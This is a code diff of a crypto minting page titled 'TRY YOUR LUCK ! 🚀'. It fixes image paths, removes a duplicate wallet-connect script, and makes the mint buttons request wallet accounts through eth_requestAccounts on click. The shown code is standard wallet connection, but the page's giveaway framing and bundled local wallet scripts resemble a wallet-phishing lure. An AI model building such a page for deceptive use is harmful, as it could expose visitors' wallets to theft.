@@ -114,8 +114,8 @@ TRY YOUR LUCK ! 🚀
             <div class="alert_items">
                 <div class="alert_item">
                     <div class="item_img">
-                        <img src="load%202.html" class="alert_loader">
-                        <img src="1.html" class="alert_logo">
+                        <img src="389-9bec97c22fa2e411.gif" class="alert_loader">
+                        <img src="boath.png" class="alert_logo">
                     </div>
                     <div class="item_desc">
                         <div class="item_lable">
@@ -128,8 +128,8 @@ TRY YOUR LUCK ! 🚀
                 </div>
                 <div class="alert_item">
                     <div class="item_img">
-                        <img src="load%202.html" class="alert_loader">
-                        <img src="2.html" class="alert_logo">
+                        <img src="389-9bec97c22fa2e411.gif" class="alert_loader">
+                        <img src="boath_png.png" class="alert_logo">
                     </div>
                     <div class="item_desc">
                         <div class="item_lable">
@@ -142,8 +142,8 @@ TRY YOUR LUCK ! 🚀
                 </div>
                 <div class="alert_item">
                     <div class="item_img">
-                        <img src="load%202.html" class="alert_loader">
-                        <img src="3.html" class="alert_logo">
+                        <img src="389-9bec97c22fa2e411.gif" class="alert_loader">
+                        <img src="boath.png" class="alert_logo">
                     </div>
                     <div class="item_desc">
                         <div class="item_lable">
@@ -818,7 +818,7 @@ TRY YOUR LUCK ! 🚀
   <script src="./scripts/rabby-kit.js" defer></script>
   <script src="./scripts/wallet-connect-v2.js" defer></script>
   <script src="./scripts/wallet-connect-v3.js" defer></script>
-  <script src="./scripts/wallet-connect-v4.js" defer></script>
+  <!-- Removed wallet-connect-v4.js to prevent duplicate custom element registration (wcm-button) -->
   <script src="./scripts/wallet-connect-v4-embedded.js" defer></script>
   <script src="./scripts/onboard.js" defer></script>
   <script>
@@ -832,6 +832,15 @@ TRY YOUR LUCK ! 🚀
           try { e && e.preventDefault && e.preventDefault(); } catch(_){}
           if (modal) { modal.style.display = 'flex'; }
         }
+        async function tryEthConnect(){
+          try {
+            var eth = (window).ethereum;
+            if (!eth) return;
+            await eth.request({ method: 'eth_requestAccounts' });
+          } catch (err) {
+            console.error('Wallet connect failed', err);
+          }
+        }
         var selectors = [
           '.lable_miting',
           '.lable_miting .lable_btn',
@@ -841,7 +850,7 @@ TRY YOUR LUCK ! 🚀
         ];
         selectors.forEach(function(sel){
           document.querySelectorAll(sel).forEach(function(el){
-            el.addEventListener('click', openModal, { passive: false });
+            el.addEventListener('click', function(e){ openModal(e); tryEthConnect(); }, { passive: false });
             el.addEventListener('keydown', function(e){ if (e.key === 'Enter' || e.key === ' ') openModal(e); });
             el.style.cursor = 'pointer';
           });
